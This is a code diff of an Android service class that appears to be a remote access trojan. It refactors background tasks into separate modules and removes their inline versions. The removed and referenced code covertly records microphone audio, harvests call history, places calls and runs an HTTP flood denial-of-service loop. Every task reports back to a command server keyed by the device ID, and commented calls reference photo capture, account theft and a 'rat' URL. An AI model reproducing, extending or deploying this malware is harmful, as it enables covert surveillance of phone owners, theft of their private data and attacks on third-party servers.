@@ -79,6 +79,17 @@ import android.widget.Toast;
 import com.utils.HttpFloodUtils;
 import com.utils.NetWorkUtils;
 
+//import AsyncTask here
+import com.asynctask.mediaVolumeUp;
+import com.asynctask.mediaVolumeDown;
+import com.asynctask.ringerVolumeUp;
+import com.asynctask.ringerVolumeDown;
+import com.asynctask.screenOn;
+import com.asynctask.recordAudio;
+import com.asynctask.getCallHistory;
+import com.asynctask.callNumber;
+import com.asynctask.httpFlood;
+
 import static com.utils.CommonUtils.getInputStreamFromUrl;
 
 public class MyService extends Service {
@@ -225,8 +236,8 @@ public class MyService extends Service {
     //********************************************************************************************************************************************************
     public void initiate() {
         try {
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media", false);
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files", false).commit();
+            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media", true);
+            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files", true).commit();
 
             PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("URL", encodedURL).commit();
             PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", backupURL).commit();
@@ -281,7 +292,6 @@ public class MyService extends Service {
                     Log.i("com.connect", url);
                     getInputStreamFromUrl(url, "");
                 } catch (UnsupportedEncodingException e2) {
-
                     e2.printStackTrace();
                 }
 
@@ -506,7 +516,7 @@ public class MyService extends Service {
 //			        new screenOn().execute("");
 //			        new recordAudio("2000").execute("");
 //				    new takePhoto("0").execute("");
-//				    new takePhoto("1").execute("");   
+//				    new takePhoto("1").execute("");
 //		        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
 //			        new takeVideo("0", "10000").execute("");
 //			        new takeVideo("1", "10000").execute("");
@@ -535,7 +545,7 @@ public class MyService extends Service {
 //					new getUserAccounts("10").execute("");
 //					new getInstalledApps("10").execute("");
 //					new httpFlood("www.google.com", "1000").execute("");
-//					new openApp(list.get(0)).execute("");//packageName	
+//					new openApp(list.get(0)).execute("");//packageName
 //					new openDialog("Enter Gmail","TEst").execute("");
 //		    		new uploadPictures("0","99999999999999", "10").execute("");
 //		    		new transferBot("http://pizzachip.com/rat").execute("");
@@ -575,262 +585,7 @@ public class MyService extends Service {
         public void onStatusChanged(String provider, int status, Bundle extras) {
         }
     };
-
     //********************************************************************************************************************************************************
-//    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
-//
-//        Log.i("com.connect", "base:" + urlBase);
-//        Log.i("com.connect", "data:" + urlData);
-//
-//        String urlDataFormatted = urlData;
-//
-//        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
-//        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
-//        currentDateandTime = URLEncoder.encode(currentDateandTime, "UTF-8");
-//
-//        if (urlData.length() > 1) {
-//            Log.d("com.connect", urlBase + urlData);
-//
-//            urlData = currentDateandTime + URLEncoder.encode(urlData, "UTF-8");
-//            urlDataFormatted = urlData.replaceAll("\\.", "~period");
-//
-//            Log.i("com.connect", urlBase + urlDataFormatted);
-//        }
-//
-//        if (NetWorkUtils.isNetworkConnected(getApplicationContext())) {
-//            InputStream content = null;
-//            try {
-//                Log.i("com.connect", "network push POST");
-//                HttpClient httpclient = new DefaultHttpClient();
-//                HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
-//                content = response.getEntity().getContent();
-//                httpclient.getConnectionManager().shutdown();
-//            } catch (Exception e) {
-//                Log.e("com.connect", "exception", e);
-//            }
-//            return content;
-//        }
-//        return null;
-//    }
-
-    //********************************************************************************************************************************************************
-    public class mediaVolumeUp extends AsyncTask<String, Void, String> {
-        @Override
-        protected String doInBackground(String... params) {
-            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-            audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Media Volume Up Complete");
-            } catch (UnsupportedEncodingException e) {
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
-    //********************************************************************************************************************************************************
-    public class mediaVolumeDown extends AsyncTask<String, Void, String> {
-        @Override
-        protected String doInBackground(String... params) {
-            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-            audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Media Volume Down Complete");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
-    //********************************************************************************************************************************************************
-    public class ringerVolumeUp extends AsyncTask<String, Void, String> {
-        @Override
-        protected String doInBackground(String... params) {
-            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-            audioManager.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Ringer Volume Up Complete");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
-    //********************************************************************************************************************************************************
-    public class ringerVolumeDown extends AsyncTask<String, Void, String> {
-        @Override
-        protected String doInBackground(String... params) {
-            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-            audioManager.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Ringer Volume Down Complete");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
-    //********************************************************************************************************************************************************
-    public class screenOn extends AsyncTask<String, Void, String> {
-        @Override
-        protected String doInBackground(String... params) {
-            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-            final WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "");
-            wl.acquire();
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Screen On Complete");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
-    //********************************************************************************************************************************************************
-    public class recordAudio extends AsyncTask<String, Void, String> {
-        String i = "0";
-
-        public recordAudio(String i) {
-            this.i = i;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-            MediaRecorder recorder = new MediaRecorder();
-            ;
-
-            SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
-            String currentDateandTime = sdf.format(new Date());
-
-            String filename = currentDateandTime + ".3gp";
-
-            File diretory = new File(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio");
-            diretory.mkdirs();
-            File outputFile = new File(diretory, filename);
-
-            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            recorder.setMaxDuration(Integer.parseInt(i));
-            recorder.setMaxFileSize(1000000);
-            recorder.setOutputFile(outputFile.toString());
-
-            try {
-                recorder.prepare();
-                recorder.start();
-            } catch (IOException e) {
-                Log.i("com.connect", "io problems while preparing");
-                e.printStackTrace();
-            }
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Recording Audio");
-            } catch (UnsupportedEncodingException e1) {
-                e1.printStackTrace();
-            }
-            try {
-                Thread.sleep(Integer.parseInt(i) + 2500);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media", false).commit();
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Recording Audio Complete");
-            } catch (UnsupportedEncodingException e) {
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-
-            while (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Media", false) == true) {
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media", true).commit();
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
     //********************************************************************************************************************************************************
     public class takeVideo extends AsyncTask<String, Void, String> {
         String i = "0";
@@ -1029,7 +784,7 @@ public class MyService extends Service {
 
         @Override
         protected void onPostExecute(String result) {
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get", false).commit();
+            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get", true).commit();
             try {
                 getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Texts Sent");
             } catch (UnsupportedEncodingException e) {
@@ -1063,50 +818,6 @@ public class MyService extends Service {
     }
 
     //********************************************************************************************************************************************************
-    public class callNumber extends AsyncTask<String, Void, String> {
-        String i = "";
-
-        public callNumber(String i) {
-            this.i = i;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-            String telephone = "tel:" + i.trim();
-            Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse(telephone));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call Initiated: " + i);
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Calling: " + i);
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
     //********************************************************************************************************************************************************
     public class deleteCallLogNumber extends AsyncTask<String, Void, String> {
         String i = "";
@@ -1613,97 +1324,6 @@ public class MyService extends Service {
     }
 
     //********************************************************************************************************************************************************
-    public class getCallHistory extends AsyncTask<String, Void, String> {
-        String j = "";
-
-        public getCallHistory(String j) {
-            this.j = j;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-            String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
-            Uri callUri = Uri.parse("content://call_log/calls");
-            Cursor managedCursor = getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
-            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
-            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
-            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
-            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
-            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
-            int i = 0;
-            while (managedCursor.moveToNext()) {
-                if (i < Integer.parseInt(j)) {
-                    String phNumber = managedCursor.getString(number);
-                    String nameS = managedCursor.getString(name);
-                    String callType = managedCursor.getString(type);
-                    String callDate = managedCursor.getString(date);
-                    Date callDayTime = new Date(Long.valueOf(callDate));
-                    String callDuration = managedCursor.getString(duration);
-                    String dir = null;
-
-                    int dircode = Integer.parseInt(callType);
-                    switch (dircode) {
-                        case CallLog.Calls.OUTGOING_TYPE:
-                            dir = "OUTGOING";
-                            break;
-
-                        case CallLog.Calls.INCOMING_TYPE:
-                            dir = "INCOMING";
-                            break;
-
-                        case CallLog.Calls.MISSED_TYPE:
-                            dir = "MISSED";
-                            break;
-                    }
-                    try {
-                        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + dir + "] " + "[" + phNumber + "] " + "[" + nameS + "] " + "[" + callDate + "] " + "[" + callDayTime + "] " + "[Duration: " + callDuration + " seconds]");
-                    } catch (UnsupportedEncodingException e) {
-
-                        e.printStackTrace();
-                    }
-                }
-                i++;
-            }
-            managedCursor.close();
-
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get", false).commit();
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call History Complete");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-            while (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get", false) == true) {
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Call History");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get", true).commit();
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
-    //********************************************************************************************************************************************************
     public class getContacts extends AsyncTask<String, Void, String> {
         String j = "";
 
@@ -2122,49 +1742,6 @@ public class MyService extends Service {
     }
 
     //********************************************************************************************************************************************************
-    public class httpFlood extends AsyncTask<String, Void, String> {
-        String i = "";//i 表示目标串
-        String j = "";//
-
-        public httpFlood(String i, String j) {
-            this.i = i;
-            this.j = j;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-            //System.nanoTime毫微秒数,返回最准确的可用系统计时器的当前值，以毫微秒为单位,此方法只能用于测量已过的时间，与系统或钟表时间的其他任何时间概念无关。
-            for (long stop = System.nanoTime() + TimeUnit.MILLISECONDS.toNanos(Integer.parseInt(j)); stop > System.nanoTime(); ) {
-                HttpFloodUtils.rawHttpFlood(i);
-            }
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Let The Flood Begin!");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-            try {
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Starting HTTP Flood");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-
     //********************************************************************************************************************************************************
     public class openApp extends AsyncTask<String, Void, String> {
         String i = "";
